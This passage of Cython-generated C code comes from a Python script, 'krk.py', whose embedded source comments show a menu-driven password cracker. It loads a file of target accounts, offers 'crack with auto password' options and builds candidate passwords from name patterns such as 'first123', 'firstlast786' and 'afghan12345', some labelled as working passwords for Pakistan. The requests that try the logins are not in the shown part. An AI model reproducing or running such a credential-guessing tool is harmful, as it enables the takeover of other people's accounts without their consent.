              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_13)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_13);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                  __pyx_t_7 = 1;
                }
              }
              {
                PyObject *__pyx_callargs[1] = {__pyx_t_13, };
                __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L13_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              }
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 90, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __pyx_t_5 = NULL;
              __pyx_t_7 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_5)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_5);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                  __pyx_t_7 = 1;
                }
              }
              {
                PyObject *__pyx_callargs[1] = {__pyx_t_5, };
                __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 90, __pyx_L13_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              }
              __pyx_v_fo = __pyx_t_4;
              __pyx_t_4 = 0;

              /* "krk.py":89
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
            }
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L18_try_end;
            __pyx_L13_error:;
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":91
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:             # <<<<<<<<<<<<<<
 *                                         print(' File location not found ')
 *                                         time.sleep(1)
 */
            __Pyx_ErrFetch(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5);
            __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_FileNotFoundError); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 91, __pyx_L15_except_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_4, __pyx_t_13);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_ErrRestore(__pyx_t_4, __pyx_t_6, __pyx_t_5);
            __pyx_t_4 = 0; __pyx_t_6 = 0; __pyx_t_5 = 0;
            if (__pyx_t_7) {
              __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 91, __pyx_L15_except_error)
              __Pyx_XGOTREF(__pyx_t_5);
              __Pyx_XGOTREF(__pyx_t_6);
              __Pyx_XGOTREF(__pyx_t_4);

              /* "krk.py":92
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 *                                         print(' File location not found ')             # <<<<<<<<<<<<<<
 *                                         time.sleep(1)
 *                                         menu()
 */
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 92, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "krk.py":93
 *                                 except FileNotFoundError:
 *                                         print(' File location not found ')
 *                                         time.sleep(1)             # <<<<<<<<<<<<<<
 *                                         menu()
 *                                 clear()
 */
              __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_time); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 93, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_sleep); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 93, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              __pyx_t_14 = NULL;
              __pyx_t_7 = 0;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_15))) {
                __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_15);
                if (likely(__pyx_t_14)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
                  __Pyx_INCREF(__pyx_t_14);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_15, function);
                  __pyx_t_7 = 1;
                }
              }
              {
                PyObject *__pyx_callargs[2] = {__pyx_t_14, __pyx_int_1};
                __pyx_t_13 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 93, __pyx_L15_except_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "krk.py":94
 *                                         print(' File location not found ')
 *                                         time.sleep(1)
 *                                         menu()             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(' Try method 2 & 3 for best results  ')
 */
              __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_menu); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 94, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_15);
              __pyx_t_14 = NULL;
              __pyx_t_7 = 0;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_15))) {
                __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_15);
                if (likely(__pyx_t_14)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
                  __Pyx_INCREF(__pyx_t_14);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_15, function);
                  __pyx_t_7 = 1;
                }
              }
              {
                PyObject *__pyx_callargs[1] = {__pyx_t_14, };
                __pyx_t_13 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 94, __pyx_L15_except_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              goto __pyx_L14_exception_handled;
            }
            goto __pyx_L15_except_error;

            /* "krk.py":89
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
            __pyx_L15_except_error:;
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
            goto __pyx_L3_error;
            __pyx_L14_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
            __pyx_L18_try_end:;
          }

          /* "krk.py":95
 *                                         time.sleep(1)
 *                                         menu()
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(' Try method 2 & 3 for best results  ')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_clear); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":96
 *                                         menu()
 *                                 clear()
 *                                 print(' Try method 2 & 3 for best results  ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 96, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":97
 *                                 clear()
 *                                 print(' Try method 2 & 3 for best results  ')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 97, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":98
 *                                 print(' Try method 2 & 3 for best results  ')
 *                                 linex()
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 mthd=input(' Choose: ')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 98, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":99
 *                                 linex()
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 mthd=input(' Choose: ')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 99, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 99, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":100
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 *                                 linex()
 *                                 mthd=input(' Choose: ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 plist = []
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 100, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_mthd = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":101
 *                                 linex()
 *                                 mthd=input(' Choose: ')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 plist = []
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 101, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 101, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":102
 *                                 mthd=input(' Choose: ')
 *                                 linex()
 *                                 plist = []             # <<<<<<<<<<<<<<
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
 *                                 ppp=input(' Choose: ')
 */
          __pyx_t_4 = PyList_New(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_plist = ((PyObject*)__pyx_t_4);
          __pyx_t_4 = 0;

          /* "krk.py":103
 *                                 linex()
 *                                 plist = []
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()             # <<<<<<<<<<<<<<
 *                                 ppp=input(' Choose: ')
 *                                 if ppp in ['1','01']:
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 103, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 103, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 103, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 103, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 103, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 103, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":104
 *                                 plist = []
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
 *                                 ppp=input(' Choose: ')             # <<<<<<<<<<<<<<
 *                                 if ppp in ['1','01']:
 *                                         plist.append('last1234')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 104, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_ppp = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":105
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
 *                                 ppp=input(' Choose: ')
 *                                 if ppp in ['1','01']:             # <<<<<<<<<<<<<<
 *                                         plist.append('last1234')
 *                                         plist.append('firstlast')
 */
          __Pyx_INCREF(__pyx_v_ppp);
          __pyx_t_4 = __pyx_v_ppp;
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 105, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L22_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 105, __pyx_L3_error)
          __pyx_t_9 = __pyx_t_8;
          __pyx_L22_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_8 = __pyx_t_9;
          if (__pyx_t_8) {

            /* "krk.py":106
 *                                 ppp=input(' Choose: ')
 *                                 if ppp in ['1','01']:
 *                                         plist.append('last1234')             # <<<<<<<<<<<<<<
 *                                         plist.append('firstlast')
 *                                         plist.append('first123')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_last1234); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 106, __pyx_L3_error)

            /* "krk.py":107
 *                                 if ppp in ['1','01']:
 *                                         plist.append('last1234')
 *                                         plist.append('firstlast')             # <<<<<<<<<<<<<<
 *                                         plist.append('first123')
 *                                         plist.append('first12345')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_firstlast); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 107, __pyx_L3_error)

            /* "krk.py":108
 *                                         plist.append('last1234')
 *                                         plist.append('firstlast')
 *                                         plist.append('first123')             # <<<<<<<<<<<<<<
 *                                         plist.append('first12345')
 *                                         plist.append('last123')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_first123); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 108, __pyx_L3_error)

            /* "krk.py":109
 *                                         plist.append('firstlast')
 *                                         plist.append('first123')
 *                                         plist.append('first12345')             # <<<<<<<<<<<<<<
 *                                         plist.append('last123')
 *                                         plist.append('last12345')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_first12345); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 109, __pyx_L3_error)

            /* "krk.py":110
 *                                         plist.append('first123')
 *                                         plist.append('first12345')
 *                                         plist.append('last123')             # <<<<<<<<<<<<<<
 *                                         plist.append('last12345')
 *                                         plist.append('firstlast123')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_last123); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 110, __pyx_L3_error)

            /* "krk.py":111
 *                                         plist.append('first12345')
 *                                         plist.append('last123')
 *                                         plist.append('last12345')             # <<<<<<<<<<<<<<
 *                                         plist.append('firstlast123')
 *                                         plist.append('afghan12345')
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_last12345); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 111, __pyx_L3_error)

            /* "krk.py":112
 *                                         plist.append('last123')
 *                                         plist.append('last12345')
 *                                         plist.append('firstlast123')             # <<<<<<<<<<<<<<
 *                                         plist.append('afghan12345')
 *                                 elif ppp in ['3','03']:
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_firstlast123); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 112, __pyx_L3_error)

            /* "krk.py":113
 *                                         plist.append('last12345')
 *                                         plist.append('firstlast123')
 *                                         plist.append('afghan12345')             # <<<<<<<<<<<<<<
 *                                 elif ppp in ['3','03']:
 *                                         clear()
 */
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_n_s_afghan12345); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 113, __pyx_L3_error)

            /* "krk.py":105
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
 *                                 ppp=input(' Choose: ')
 *                                 if ppp in ['1','01']:             # <<<<<<<<<<<<<<
 *                                         plist.append('last1234')
 *                                         plist.append('firstlast')
 */
            goto __pyx_L21;
          }

          /* "krk.py":114
 *                                         plist.append('firstlast123')
 *                                         plist.append('afghan12345')
 *                                 elif ppp in ['3','03']:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 */
          __Pyx_INCREF(__pyx_v_ppp);
          __pyx_t_4 = __pyx_v_ppp;
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_3, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 114, __pyx_L3_error)
          if (!__pyx_t_9) {
          } else {
            __pyx_t_8 = __pyx_t_9;
            goto __pyx_L24_bool_binop_done;
          }
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_03, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 114, __pyx_L3_error)
          __pyx_t_8 = __pyx_t_9;
          __pyx_L24_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_9 = __pyx_t_8;
          if (__pyx_t_9) {

            /* "krk.py":115
 *                                         plist.append('afghan12345')
 *                                 elif ppp in ['3','03']:
 *                                         clear()             # <<<<<<<<<<<<<<
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_clear); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 115, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":116
 *                                 elif ppp in ['3','03']:
 *                                         clear()
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 116, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":117
 *                                         clear()
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 117, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
